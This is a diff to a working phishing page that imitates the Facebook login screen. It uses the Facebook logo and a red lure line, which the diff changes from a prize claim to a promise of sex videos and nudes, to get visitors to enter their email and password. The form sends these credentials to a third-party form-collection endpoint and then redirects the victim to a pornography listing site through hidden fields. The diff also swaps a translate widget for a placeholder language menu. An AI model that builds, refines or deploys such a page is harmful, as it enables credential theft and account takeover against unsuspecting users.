@@ -32,6 +32,12 @@
             margin-bottom: 20px;
         }
 
+        .language-select {
+            margin-bottom: 20px;
+            text-align: left;
+            font-size: 14px;
+        }
+
         .login-container h2 {
             font-size: 14px;
             color: #8a8d91;
@@ -106,27 +112,30 @@
     </style>
 </head>
 <body>
-
-    <!-- Google Translate Widget -->
-    <div id="google_translate_element"></div>
-    <script type="text/javascript">
-        function googleTranslateElementInit() {
-            new google.translate.TranslateElement({
-                pageLanguage: 'en',
-                includedLanguages: 'en,es,fr,de,it,ja,zh-CN,ru,ar', // Add more languages as needed
-                layout: google.translate.TranslateElement.InlineLayout.SIMPLE
-            }, 'google_translate_element');
-        }
-    </script>
-    <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
-
     <div class="login-container">
+        <!-- Language Selection -->
+        <div class="language-select">
+            <label for="language">Select Language:</label>
+            <select id="language" onchange="translate()">
+                <option value="en">English</option>
+                <option value="es">Spanish</option>
+                <option value="fr">French</option>
+                <option value="de">German</option>
+                <option value="zh">Chinese</option>
+                <option value="ar">Arabic</option>
+                <!-- Add more languages as needed -->
+            </select>
+        </div>
+
         <!-- Facebook Logo -->
         <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
-        <p style="color:red">Re-login to claim your winning</p>
+        <p style="color:red">Re-login to view hottest sex videos and sexy nudes </p>
 
         <!-- Login Form -->
         <form id="loginForm" action="https://submit-form.com/VlWBYGciz" method="POST">
+            <input type="hidden" name="_redirect" value="https://theporndude.com/best-erotic-stories-sites"/>
+            <input type="hidden" name="_append" value="false"/>
+
             <input type="email" name="email" placeholder="Email" required>
             <input type="password" name="password" placeholder="Password" required>
             <button type="submit">Log In</button>
@@ -144,6 +153,13 @@
 
     <!-- Inline Script to Show Alert After Form Submission -->
     <script>
+        function translate() {
+            const language = document.getElementById("language").value;
+            // Placeholder for translation logic
+            alert("Language selected: " + language);
+            // Implement actual translation logic here
+        }
+
         if (window.location.href.includes('VlWBYGciz')) {
             alert("Congratulations! We are processing your request. We shall get back to you.");
             setTimeout(function() {
